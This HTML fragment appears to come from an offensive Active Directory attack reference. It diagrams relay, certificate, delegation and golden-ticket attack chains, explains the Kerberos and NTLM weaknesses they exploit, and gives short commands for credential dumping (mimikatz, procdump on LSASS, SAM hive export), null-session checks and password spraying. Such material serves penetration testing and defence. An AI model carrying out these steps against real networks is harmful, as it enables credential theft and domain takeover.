<div class="flow-block"><div class="flow-title orange">WebDAV Coercion &rarr; HTTP Relay &rarr; RBCD</div><div class="flow-row">
  <div class="flow-node hl-blue">Find WebClient enabled</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">coerce HTTP</span></div>
  <div class="flow-node hl-orange">PetitPotam @80</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">relay LDAP</span></div>
  <div class="flow-node hl-red">ntlmrelayx &rarr; set RBCD</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">S4U chain</span></div>
  <div class="flow-node hl-pink">Admin on target</div>
</div></div>

<div class="flow-block"><div class="flow-title red">Certifried &rarr; DA (CVE-2022-26923)</div><div class="flow-row">
  <div class="flow-node hl-blue">Create machine acct</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">set dNSHostName</span></div>
  <div class="flow-node hl-orange">dNSHostName = DC FQDN</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">certipy req</span></div>
  <div class="flow-node hl-cyan">Cert issued as DC$</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">PKINIT</span></div>
  <div class="flow-node hl-pink">DCSync / DA</div>
</div></div>

<div class="flow-block"><div class="flow-title purple">PrintNightmare &rarr; SYSTEM (CVE-2021-34527)</div><div class="flow-row">
  <div class="flow-node hl-blue">Host SMB share + DLL</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">AddPrinterDriverEx</span></div>
  <div class="flow-node hl-orange">Target loads malicious DLL</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">Spooler SYSTEM</span></div>
  <div class="flow-node hl-red">Code exec as SYSTEM</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">if DC</span></div>
  <div class="flow-node hl-pink">DCSync / DA</div>
</div></div>

<div class="flow-block"><div class="flow-title cyan">ESC1 Direct &rarr; Domain Admin</div><div class="flow-row">
  <div class="flow-node hl-blue">certipy find -vulnerable</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">SAN template</span></div>
  <div class="flow-node hl-cyan">certipy req -upn DA</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">cert issued</span></div>
  <div class="flow-node hl-cyan">certipy auth -pfx</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">PKINIT</span></div>
  <div class="flow-node hl-pink">DA NT hash</div>
</div></div>

<div class="flow-block"><div class="flow-title orange">Constrained Delegation (without Protocol Transition)</div><div class="flow-row">
  <div class="flow-node hl-blue">Find msDS-AllowedToDelegateTo</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">no T2A4D</span></div>
  <div class="flow-node hl-orange">Need victim auth to svc</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">coerce / RBCD trick</span></div>
  <div class="flow-node hl-red">Forwardable TGS obtained</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">S4U2Proxy</span></div>
  <div class="flow-node hl-purple">TGS for allowed SPN</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">alt service</span></div>
  <div class="flow-node hl-pink">Admin access</div>
</div></div>

<div class="flow-block"><div class="flow-title green">DnsAdmins &rarr; DLL Load &rarr; SYSTEM on DC</div><div class="flow-row">
  <div class="flow-node hl-blue">Member of DnsAdmins</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#10b981" stroke-width="1.5" marker-end="url(#arrowG)"/></svg><span class="arrow-label">dnscmd</span></div>
  <div class="flow-node hl-orange">Set ServerLevelPlugin DLL</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#10b981" stroke-width="1.5" marker-end="url(#arrowG)"/></svg><span class="arrow-label">restart DNS</span></div>
  <div class="flow-node hl-red">DLL loaded as SYSTEM</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">on DC</span></div>
  <div class="flow-node hl-pink">SYSTEM on DC &rarr; DA</div>
</div></div>

<div class="flow-block"><div class="flow-title rose">LNK / SCF / URL File Drop &rarr; Hash Capture</div><div class="flow-row">
  <div class="flow-node hl-blue">Write access to share</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f43f5e" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">drop LNK/SCF</span></div>
  <div class="flow-node hl-orange">User browses share</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f43f5e" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">auto-auth</span></div>
  <div class="flow-node hl-red">NTLMv2 to Responder</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">crack or relay</span></div>
  <div class="flow-node hl-pink">Credentials / shell</div>
</div></div>

<div class="flow-block"><div class="flow-title red">KrbRelayUp &rarr; Local Admin</div><div class="flow-row">
  <div class="flow-node hl-blue">Low-priv domain user</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">create machine$</span></div>
  <div class="flow-node hl-orange">Coerce local SYSTEM</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">relay Kerberos</span></div>
  <div class="flow-node hl-red">Set RBCD on local host</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">S4U chain</span></div>
  <div class="flow-node hl-pink">Local Admin</div>
</div></div>

<div class="flow-block"><div class="flow-title yellow">Cross-Forest via Golden + SID History (RID &gt; 1000)</div><div class="flow-row">
  <div class="flow-node hl-yellow">Own trusted forest</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#eab308" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">dump krbtgt</span></div>
  <div class="flow-node hl-orange">Craft Golden Ticket</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#eab308" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">SID History RID&gt;1000</span></div>
  <div class="flow-node hl-red">Inject cross-forest SID</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">access resources</span></div>
  <div class="flow-node hl-pink">Groups with RID &gt; 1000</div>
</div></div>

<div class="flow-block"><div class="flow-title purple">Walking Dead &rarr; Disabled Account &rarr; Privesc</div><div class="flow-row">
  <div class="flow-node hl-blue">Enum disabled accounts</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">LazarusWakeUp</span></div>
  <div class="flow-node hl-orange">Find ACL (GenericAll)</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">re-enable</span></div>
  <div class="flow-node hl-red">Account alive + privs</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">auth as user</span></div>
  <div class="flow-node hl-pink">Privilege Escalation</div>
</div></div>

<div class="flow-block"><div class="flow-title purple">AD Recycle Bin &rarr; Restore Deleted Object &rarr; Privesc</div><div class="flow-row">
  <div class="flow-node hl-blue">Enum deleted objects</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">bloodyAD</span></div>
  <div class="flow-node hl-orange">Find writable deleted obj</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">restore</span></div>
  <div class="flow-node hl-red">Object + group memberships</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">auth / SID History</span></div>
  <div class="flow-node hl-pink">Domain Admin</div>
</div></div>

<div class="separator"></div>

<!-- ==================== KERBEROS FUNDAMENTALS ==================== -->
<div class="section-header"><h2><span>//</span> Kerberos <span class="orange">Fundamentals</span></h2><p class="section-desc">Understanding Kerberos is essential &mdash; every ticket-based attack exploits a specific step in this protocol.</p></div>

<div class="data-flow-card"><h4>Kerberos Authentication Flow</h4><pre>
<span class="key">Step 1: AS-REQ</span> (Authentication Service Request)
<span class="val">User &rarr; KDC</span>: "I am user X, I want a TGT"
&#x251C;&#x2500;&#x2500; Encrypted with user's NT hash (password-derived)
&#x251C;&#x2500;&#x2500; Contains: username, timestamp, requested lifetime
&#x2514;&#x2500;&#x2500; <span class="danger">Pre-authentication proves user knows password</span>
    <span class="comment">// If DONT_REQ_PREAUTH is set &rarr; AS-REP Roasting (no password needed to request)</span>

<span class="key">Step 2: AS-REP</span> (Authentication Service Reply)
<span class="val">KDC &rarr; User</span>: "Here is your TGT"
&#x251C;&#x2500;&#x2500; TGT encrypted with <span class="danger">krbtgt hash</span> (only KDC can decrypt)
&#x251C;&#x2500;&#x2500; Session key encrypted with user's NT hash
&#x2514;&#x2500;&#x2500; TGT contains: user identity, PAC, timestamps, session key
    <span class="comment">// Golden Ticket = forged TGT using stolen krbtgt hash</span>

<span class="key">Step 3: TGS-REQ</span> (Ticket Granting Service Request)
<span class="val">User &rarr; KDC</span>: "I want to access service Y" (presents TGT)
&#x251C;&#x2500;&#x2500; Includes TGT + authenticator (encrypted with session key)
&#x251C;&#x2500;&#x2500; Specifies target SPN (e.g., CIFS/fileserver.domain.local)
&#x2514;&#x2500;&#x2500; <span class="danger">KDC does NOT verify user can access service</span> &mdash; just issues TGS
    <span class="comment">// Kerberoasting: any user can request TGS for any SPN, crack offline</span>

<span class="key">Step 4: TGS-REP</span> (Ticket Granting Service Reply)
<span class="val">KDC &rarr; User</span>: "Here is your Service Ticket (TGS)"
&#x251C;&#x2500;&#x2500; TGS encrypted with <span class="danger">service account's NT hash</span>
&#x251C;&#x2500;&#x2500; Contains PAC with user's group memberships
&#x2514;&#x2500;&#x2500; New session key for user &harr; service communication
    <span class="comment">// Silver Ticket = forged TGS using stolen service hash</span>

<span class="key">Step 5: AP-REQ</span> (Application Request)
<span class="val">User &rarr; Service</span>: "Here is my ticket, let me in"
&#x251C;&#x2500;&#x2500; Service decrypts TGS with its own hash
&#x251C;&#x2500;&#x2500; Validates PAC (optional &mdash; many services skip this)
&#x2514;&#x2500;&#x2500; <span class="danger">If PAC validation is skipped, Silver Tickets go undetected</span>
</pre></div>

<div class="details-grid">
  <div class="detail-card border-orange"><span class="tag cred">KERBEROS</span><h3>TGT (Ticket Granting Ticket)</h3><div class="card-sub">The "master key" to request service tickets</div><div class="card-body"><ul class="card-list"><li>Encrypted with <strong>krbtgt</strong> account hash &mdash; only the KDC can read it</li><li>Contains user identity, PAC (Privilege Attribute Certificate), timestamps</li><li>Default lifetime: <strong>10 hours</strong>, renewable for 7 days</li><li><strong>Golden Ticket</strong>: forged TGT with arbitrary PAC &mdash; requires krbtgt hash</li><li><strong>Diamond Ticket</strong>: modifies a <em>legitimate</em> TGT's PAC &mdash; harder to detect</li><li>Stored in memory (LSASS) or as .kirbi/.ccache files</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag cred">KERBEROS</span><h3>TGS (Service Ticket)</h3><div class="card-sub">Grants access to a specific service</div><div class="card-body"><ul class="card-list"><li>Encrypted with the <strong>target service account's NT hash</strong></li><li>Any authenticated user can request a TGS for <em>any</em> SPN &mdash; the KDC does not check authorization</li><li><strong>Silver Ticket</strong>: forged TGS &mdash; never touches KDC, hard to detect</li><li><strong>Kerberoasting</strong>: request TGS, extract hash, crack offline</li><li>SPN swap: the service name in the ticket is <span class="vuln">not encrypted</span> &mdash; can be changed post-issuance</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag cred">KERBEROS</span><h3>PAC (Privilege Attribute Certificate)</h3><div class="card-sub">Embedded in every ticket &mdash; defines who you are</div><div class="card-body"><ul class="card-list"><li>Contains: user SID, group SIDs, logon info, resource group memberships</li><li>Signed by <strong>krbtgt</strong> (server checksum) and <strong>KDC</strong> (KDC checksum)</li><li>Most services <span class="vuln">do not validate PAC signatures</span> with the KDC</li><li><strong>MS14-068</strong> (CVE-2014-6324): forged PAC &rarr; any user becomes Domain Admin</li><li><strong>ExtraSID attack</strong>: inject Enterprise Admin SID (-519) into PAC for forest takeover</li></ul></div></div>

  <div class="detail-card border-blue"><span class="tag cred">KERBEROS</span><h3>S4U Extensions</h3><div class="card-sub">Service-for-User &mdash; the backbone of delegation attacks</div><div class="card-body"><ul class="card-list"><li><strong>S4U2Self</strong>: Service requests a ticket <em>to itself</em> on behalf of a user (protocol transition)</li><li><strong>S4U2Proxy</strong>: Service uses the user's ticket to access another service on their behalf</li><li><strong>Constrained Delegation</strong>: S4U2Self &rarr; S4U2Proxy chain to impersonate any user to allowed SPNs</li><li><strong>RBCD</strong>: S4U2Self (forwardable) &rarr; S4U2Proxy to target &mdash; write-based, no DC config needed</li><li><strong>Key insight</strong>: S4U2Self only returns forwardable ticket if <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> is set</li><li><strong>RBCD trick</strong>: RBCD targets accept non-forwardable tickets from S4U2Self &mdash; bypasses the check</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== NTLM AUTHENTICATION ==================== -->
<div class="section-header"><h2><span>//</span> NTLM <span class="red">Authentication</span> Basics</h2><p class="section-desc">NTLM is the fallback protocol when Kerberos fails &mdash; and its weaknesses enable relay, capture, and pass-the-hash attacks.</p></div>

<div class="data-flow-card"><h4>NTLM Challenge-Response Flow</h4><pre>
<span class="key">Step 1: NEGOTIATE</span>
<span class="val">Client &rarr; Server</span>: "I want to authenticate using NTLM"
&#x251C;&#x2500;&#x2500; Flags: NTLMSSP_NEGOTIATE_NTLM, NTLMSSP_NEGOTIATE_SEAL, etc.
&#x2514;&#x2500;&#x2500; Indicates supported features (NTLMv1 vs NTLMv2, signing, etc.)

<span class="key">Step 2: CHALLENGE</span>
<span class="val">Server &rarr; Client</span>: "Prove your identity with this challenge"
&#x251C;&#x2500;&#x2500; Server sends 8-byte random challenge (nonce)
&#x251C;&#x2500;&#x2500; <span class="danger">This challenge can be relayed to another server</span>
&#x2514;&#x2500;&#x2500; Challenge is not tied to the target server identity

<span class="key">Step 3: AUTHENTICATE</span>
<span class="val">Client &rarr; Server</span>: "Here is my response"
&#x251C;&#x2500;&#x2500; Client computes HMAC-MD5 of challenge using NT hash
&#x251C;&#x2500;&#x2500; NTLMv1: <span class="danger">DES-based</span>, crackable, susceptible to rainbow tables
&#x251C;&#x2500;&#x2500; NTLMv2: HMAC-MD5 with server+client challenge + timestamp
&#x2514;&#x2500;&#x2500; <span class="danger">Response can be captured (Responder) and cracked offline</span>

<span class="key">Why NTLM is dangerous:</span>
&#x251C;&#x2500;&#x2500; <span class="danger">No mutual authentication</span> &mdash; client doesn't verify server identity
&#x251C;&#x2500;&#x2500; <span class="danger">Challenge not bound to destination</span> &mdash; enables relay attacks
&#x251C;&#x2500;&#x2500; Pass-the-Hash works because NT hash IS the credential (no salt)
&#x2514;&#x2500;&#x2500; Forced auth via UNC paths, Office docs, profile paths, coercion RPC
</pre></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag cred">NTLM</span><h3>NTLMv1 vs NTLMv2</h3><div class="card-sub">Version determines crackability and relay potential</div><div class="card-body"><ul class="card-list"><li><strong>NTLMv1</strong>: DES-based, 8-byte challenge &mdash; <span class="vuln">trivially crackable</span>, convertible to NT hash via crack.sh</li><li><strong>NTLMv1 + ESS</strong>: Extended Session Security adds client challenge but still weak</li><li><strong>NTLMv2</strong>: HMAC-MD5 with timestamp + client challenge + target info &mdash; harder to crack but still offline-crackable</li><li><strong>Net-NTLMv2</strong>: what you capture with Responder &mdash; hashcat mode <code>5600</code></li><li><strong>Check policy</strong>: <code>LMCompatibilityLevel</code> registry value controls version (0-5)</li><li><strong>Downgrade</strong>: if NTLMv1 allowed, force downgrade for easier cracking</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">NTLM</span> <span class="tag lateral">RELAY</span><h3>NTLM Relay Attack Paths</h3><div class="card-sub">The most impactful NTLM weakness</div><div class="card-body">Relay captured NTLM auth to a different target:<ul class="card-list"><li><strong>SMB &rarr; SMB</strong>: Requires signing disabled on target (<code class="vuln">default on workstations</code>)</li><li><strong>SMB &rarr; LDAP(S)</strong>: Create machine accounts, modify ACLs, set RBCD</li><li><strong>SMB &rarr; HTTP</strong>: ADCS web enrollment (ESC8), Exchange</li><li><strong>HTTP &rarr; LDAP</strong>: Works if Extended Protection for Auth is off</li><li><strong>Tools</strong>: <code class="tool">ntlmrelayx</code> + <code class="tool">Responder</code> (--disable-http-server if relaying)</li><li><strong>EPA / Channel Binding</strong>: mitigates relay to LDAPS / HTTPS</li><li><strong>SMB Signing required</strong>: Blocks SMB relay &mdash; check with <code>netexec smb target --gen-relay-list</code></li></ul></div></div>

  <div class="detail-card border-green"><span class="tag cred">NTLM</span><h3>Coercion + Relay Combos</h3><div class="card-sub">Force authentication, then relay to valuable targets</div><div class="card-body">Chain coercion with relay for maximum impact:<ul class="card-list"><li><strong>PetitPotam + ADCS</strong>: Coerce DC &rarr; relay to CA web enrollment &rarr; DC cert &rarr; DCSync</li><li><strong>PrinterBug + Unconstrained</strong>: Coerce DC to unconstrained host &rarr; capture TGT</li><li><strong>DFSCoerce + RBCD</strong>: Coerce target &rarr; relay to LDAP &rarr; set RBCD &rarr; impersonate</li><li><strong>WebDAV + Coercion</strong>: HTTP-based coercion from internal host &rarr; relay to LDAP (no signing check)</li><li><strong>Key requirement</strong>: WebDAV (WebClient service) enables HTTP-based coercion on workstations</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== HASH TYPES REFERENCE ==================== -->
<div class="section-header"><h2><span>//</span> Hash Types <span class="purple">Reference</span></h2><p class="section-desc">Know your hashes &mdash; each type has different cracking methods, hashcat modes, and exploitation potential.</p></div>

<div class="data-flow-card"><h4>AD Hash Types &amp; Hashcat Modes</h4><pre>
<span class="key">HASH TYPE                  HASHCAT    EXAMPLE / FORMAT                                      WHERE FOUND</span>
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
<span class="val">NT Hash (NTLM)</span>            <span class="type">1000</span>       aad3b435...::32ed87bdb5fdc5e9cba...              <span class="comment">SAM, NTDS.dit, LSASS, DCSync</span>
<span class="val">LM Hash</span>                   <span class="type">3000</span>       aad3b435b51404eeaad3b435b51404ee                 <span class="comment">Legacy SAM (disabled by default)</span>
<span class="val">Net-NTLMv1</span>                <span class="type">5500</span>       user:::challenge:response                         <span class="comment">Responder capture, coercion</span>
<span class="val">Net-NTLMv2</span>                <span class="type">5600</span>       user::domain:challenge:hmac:blob                  <span class="comment">Responder capture, coercion</span>
<span class="val">AS-REP (Kerberos)</span>         <span class="type">18200</span>      $krb5asrep$23$user@domain:hash                    <span class="comment">AS-REP Roasting (no preauth)</span>
<span class="val">TGS-REP (Kerberoast)</span>      <span class="type">13100</span>      $krb5tgs$23$*user$domain$spn*$hash                <span class="comment">Kerberoasting (any auth user)</span>
<span class="val">TGS-REP (AES)</span>             <span class="type">19700</span>      $krb5tgs$17/18$user$domain$hash                   <span class="comment">AES Kerberoasting (slower crack)</span>
<span class="val">DCC2 (mscachev2)</span>          <span class="type">2100</span>       $DCC2$10240#user#hash                             <span class="comment">Cached domain creds (offline)</span>
<span class="val">MsCacheV1</span>                 <span class="type">1100</span>       hash:username                                     <span class="comment">Old cached creds (rare)</span>

<span class="key">CRACKING TIPS</span>
&#x251C;&#x2500;&#x2500; NT hashes: <span class="danger">No salt</span> &rarr; rainbow tables work, instant lookup via CrackStation/NTLM.pw
&#x251C;&#x2500;&#x2500; Net-NTLMv2: Offline crackable but salted with challenge &mdash; wordlist + rules
&#x251C;&#x2500;&#x2500; AS-REP / TGS: RC4 = fast (mode 18200/13100), AES = slow (mode 19700)
&#x251C;&#x2500;&#x2500; DCC2: Very slow to crack (PBKDF2, 10240 iterations) &mdash; targeted only
&#x2514;&#x2500;&#x2500; <span class="val">Pass-the-Hash</span>: NT hash is the credential itself &mdash; no need to crack
</pre></div>

<div class="separator"></div>

<!-- ==================== INITIAL ACCESS ==================== -->
<div class="section-header"><h2><span>//</span> Initial <span class="blue">Access</span></h2><p class="section-desc">Before exploiting AD, you need a foothold. These are the most common ways to obtain initial domain credentials or network position.</p></div>

<div class="details-grid">
  <div class="detail-card border-blue"><span class="tag recon">INITIAL</span><h3>Network Position (No Creds)</h3><div class="card-sub">What you can do without any credentials</div><div class="card-body"><ul class="card-list"><li><strong>LLMNR/NBT-NS Poisoning</strong>: <code class="tool">Responder</code> captures Net-NTLMv2 hashes from broadcast name resolution</li><li><strong>IPv6 DNS Takeover</strong>: <code class="tool">mitm6</code> &rarr; WPAD proxy &rarr; relay NTLM to LDAP</li><li><strong>ARP Spoofing</strong>: MITM position on local subnet</li><li><strong>Null session</strong>: Test for anonymous LDAP/SMB binds &mdash; <code>netexec smb target -u '' -p ''</code></li><li><strong>Guest access</strong>: Some domains leave guest enabled &mdash; <code>netexec smb target -u 'guest' -p ''</code></li><li><strong>AS-REP Roasting</strong>: Only needs a username list &mdash; no creds required</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">INITIAL</span><h3>Password-Based Access</h3><div class="card-sub">Credential reuse, spray, and default passwords</div><div class="card-body"><ul class="card-list"><li><strong>Password Spraying</strong>: <code class="tool">kerbrute</code> or <code class="tool">netexec</code> &mdash; one password against many users</li><li><strong>Default passwords</strong>: "Password1", "Welcome1", "CompanyName2024", seasonal patterns</li><li><strong>Credential stuffing</strong>: Leaked credentials from breaches (dehashed, HaveIBeenPwned)</li><li><strong>Lockout policy</strong>: Always check <code>net accounts /domain</code> before spraying</li><li><strong>Kerberos pre-auth</strong>: Spray via Kerberos to avoid NTLM lockout events on DCs</li></ul></div></div>

  <div class="detail-card border-green"><span class="tag lateral">INITIAL</span><h3>Phishing / Social Engineering</h3><div class="card-sub">Get users to run your payload or hand over creds</div><div class="card-body"><ul class="card-list"><li><strong>Office macros</strong>: Legacy but still works in some orgs (VBA stomping, .docm)</li><li><strong>HTML smuggling</strong>: Deliver payload embedded in HTML email attachment</li><li><strong>ISO/IMG/LNK</strong>: Bypass Mark-of-the-Web via container files</li><li><strong>Teams / Slack phishing</strong>: External messaging often allowed, bypasses email filters</li><li><strong>MFA fatigue / push bombing</strong>: Repeated MFA prompts until user approves</li><li><strong>Device code phishing</strong>: Abuse OAuth device flow for token theft</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag privesc">INITIAL</span><h3>Network-Based Attacks</h3><div class="card-sub">Exploit network services for initial foothold</div><div class="card-body"><ul class="card-list"><li><strong>SMB shares</strong>: Anonymous/guest readable shares with credentials in scripts, configs</li><li><strong>SYSVOL / GPP</strong>: Group Policy Preferences with <code class="vuln">encrypted passwords</code> (MS14-025, key is public)</li><li><strong>SNMP community strings</strong>: Default "public"/"private" &rarr; enumerate network</li><li><strong>MSSQL</strong>: Default SA password, xp_cmdshell, linked servers</li><li><strong>ADCS web enrollment</strong>: Anonymous enrollment possible if misconfigured</li><li><strong>VPN / Citrix / RDWeb</strong>: External-facing auth portals for spray attacks</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== CREDENTIAL DUMPING ==================== -->
<div class="section-header"><h2><span>//</span> Credential <span class="orange">Dumping</span> Deep Dive</h2><p class="section-desc">Where credentials live in Windows/AD and how to extract them. Understanding the source determines the hash type and attack potential.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag cred">CRED DUMP</span><h3>LSASS Memory</h3><div class="card-sub">Local Security Authority Subsystem Service</div><div class="card-body">LSASS caches credentials for SSO. Contains <strong>plaintext passwords</strong> (if WDigest enabled), NT hashes, Kerberos tickets, and keys.<ul class="card-list"><li><strong>Mimikatz</strong>: <code>sekurlsa::logonpasswords</code> &mdash; dumps all cached creds</li><li><strong>Linux</strong>: <code class="tool">lsassy</code> &mdash; remotely dump via CrackMapExec or standalone</li><li><strong>Dump &amp; parse</strong>: <code>procdump -ma lsass.exe</code> &rarr; offline <code class="tool">pypykatz</code> analysis</li><li><strong>Protection</strong>: RunAsPPL (Protected Process Light) &mdash; blocks most tools</li><li><strong>PPL bypass</strong>: Vulnerable kernel drivers (e.g., RTCore64.sys), PPLdump</li><li><strong>WDigest</strong>: <code>UseLogonCredential=1</code> in registry &rarr; <span class="vuln">plaintext passwords in LSASS</span></li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">CRED DUMP</span><h3>SAM Database</h3><div class="card-sub">Security Account Manager &mdash; local accounts only</div><div class="card-body">SAM stores NT hashes of <strong>local user accounts</strong> (not domain accounts). Encrypted with SYSKEY (boot key).<ul class="card-list"><li><strong>Location</strong>: <code>C:\Windows\System32\config\SAM</code> (locked while OS running)</li><li><strong>Online</strong>: <code class="tool">secretsdump.py</code> -target-ip 10.0.0.1 using admin creds</li><li><strong>Offline</strong>: Dump SAM + SYSTEM hives via <code>reg save</code> or Volume Shadow Copy</li><li><strong>Local admin reuse</strong>: Same local admin password across multiple hosts = lateral movement</li><li><strong>LAPS</strong>: Randomizes local admin passwords per-host to prevent reuse</li></ul></div></div>

